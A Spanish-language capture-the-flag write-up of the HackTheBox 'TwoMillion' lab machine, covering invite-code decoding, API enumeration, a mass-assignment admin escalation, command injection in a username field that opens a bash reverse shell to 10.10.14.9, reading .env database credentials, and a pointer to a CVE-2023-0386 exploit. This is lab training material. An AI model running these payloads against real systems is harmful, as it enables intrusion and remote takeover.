___
#postman #decode #rot13 #base64

___
### Dentro de la pagina web
Encontramos un boton para ingresar a la plataforma HTB y nos pide un codigo de invitacion, al cargar la pagina revisamos las herramientas de desarrollo, en la pestaña de internet y encontramos un archivo que se consulta `inviteapi.min.js` y al inspeccionar vemos que tiene el response ofuscado y lo decodificamos en https://thanhle.io.vn/de4js/

Encontramos una funcion `makeInvitateCode()` y al probarlo en la consola devuelve esto:
```json
{
0: 200,
data: Object {
 data: "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr",
 enctype: "ROT13" },
hint: "Data is encrypted ... We should probbably check the encryption type in order to decrypt it...",
success: 1
}
```

Nos devuelve un codigo encriptado con ROT13, asi que intentamos desencriptarlo

```bash
echo "Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr" | tr "A-Za-z" "N-ZA-Mn-za-m"

# Resultado:
# In order to generate the invite code, make a POST request to /api/v1/invite/generate
```

### Postman
Realizamos la peticion`POST` al endpoint y nos devuelve
```json
{
code:"TzI1TUEtTzRBNkQtWlNRNDItVzFDWjc=",
format:"encoded"
}
```

Esto nos devuelve el codigo en base64

```sh
echo "TzI1TUEtTzRBNkQtWlNRNDItVzFDWjc=" | base64 -d ; echo
# O25MA-O4A6D-ZSQ42-W1CZ7
```

## Entramos 
### Informacion de registro
- Usuario: Wua
- Email: wua@test.com
- Password: test1234


## Enumeracion de la API
Con curl realizamos una peticion al endpoitn `/api/v1`
```sh
curl -s -X GET "http://2million.htb/api/v1" -H "Cookie: PHPSESSID=..." -v

# Resultado
  "v1": {
    "user": {
      "GET": {
        "/api/v1": "Route List",
        "/api/v1/invite/how/to/generate": "Instructions on invite code generation",
        "/api/v1/invite/generate": "Generate invite code",
        "/api/v1/invite/verify": "Verify invite code",
        "/api/v1/user/auth": "Check if user is authenticated",
        "/api/v1/user/vpn/generate": "Generate a new VPN configuration",
        "/api/v1/user/vpn/regenerate": "Regenerate VPN configuration",
        "/api/v1/user/vpn/download": "Download OVPN file"
      },
      "POST": {
        "/api/v1/user/register": "Register a new user",
        "/api/v1/user/login": "Login with existing user"
      }
    },
    "admin": {
      "GET": {
        "/api/v1/admin/auth": "Check if user is admin"
      },
      "POST": {
        "/api/v1/admin/vpn/generate": "Generate VPN for specific user"
      },
      "PUT": {
        "/api/v1/admin/settings/update": "Update user settings"
      }
    }
  }
}
```

### Jugamos con el endpint /api/v1/admin/settings/update 
Intentamos generar una vpn, pero nos indica un estado HTTP 401, entonces probamos actualizar nuestro usuario 
```sh
❯ curl -s -X PUT "http://2million.htb/api/v1/admin/settings/update" -H "Cookie: PHPSESSID=5s15e062amjg0jica2ddbqj6k7" -H "Content-Type: application/json" -d '{"email":"chicoj2ck@chicoj2ck.com", "is_admin":1}'| jq ; echo

# Response
{
  "id": 13,
  "username": "chicoj2ck",
  "is_admin": 1
}
```

Luego generamos la vpn ya como admin:
```sh
curl -s -X POST "http://2million.htb/api/v1/admin/vpn/generate" -H "Cookie: PHPSESSID=5s15e062amjg0jica2ddbqj6k7" -H "Content-Type: application/json" -d '{"username":"chicoj2ck"}'

# Resultado -> la vpn
```

## Remote Code Execution
```sh
curl -s -X POST "http://2million.htb/api/v1/admin/vpn/generate" -H "Cookie: PHPSESSID=5s15e062amjg0jica2ddbqj6k7" -H "Content-Type: application/json" -d '{"username":"chicoj2ck; bash -c \"bash -i >& /dev/tcp/10.10.14.9/443 0>&1 \";"}' -v

## + nc -nlvp 443 -> me da la terminal
```

### Tratamiento de la tty

### Tratamiento base
```sh

# pseudo consola
script /dev/null -c bash

# suspende el proceso
ctrl + z

# 
stty raw -echo; fg

reset xterm
```

### Resize de la terminal
```sh
# para saber filas y columnas
stty size

# seteo de filas y columnas
stty rows 40 columns 184 
```

## Dentro del Servidor

Encontramos un archivo Database.php y .env, asi que leyendo el .env escalamos a admin


```sh
# .env
DB_HOST=127.0.0.1
DB_DATABASE=htb_prod
DB_USERNAME=admin
DB_PASSWORD=SuperDuperPass12
```

## Escalada de Privilegios
```sh
# probamos los convencionales y no habia nada raro

# buscamos archivos donde admin sea propietario
find / -user admin 2>/dev/null 

# vemos mucho ruido asi que lo filtramos

find / -user admin 2>/dev/null | grep -vE "sys|proc"
```

Encontre un mail `/var/mail/admin`:
```sh
cat /var/mail/admin

# Response
From: ch4p <ch4p@2million.htb>
To: admin <admin@2million.htb>
Cc: g0blin <g0blin@2million.htb>
Subject: Urgent: Patch System OS
Date: Tue, 1 June 2023 10:45:22 -0700
Message-ID: <9876543210@2million.htb>
X-Mailer: ThunderMail Pro 5.2

Hey admin,

I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.

HTB Godfather
```

## Vulnerabilidad CVE-2023-0386
Buscamos la vulnerabilidad a traves del correo y encontramos esta herramienta
- https://github.com/puckiestyle/CVE-2023-0386

## Flags
- `/admin/user.txt`
- `/root/root.txt`
- `/root/thank_you.json` 
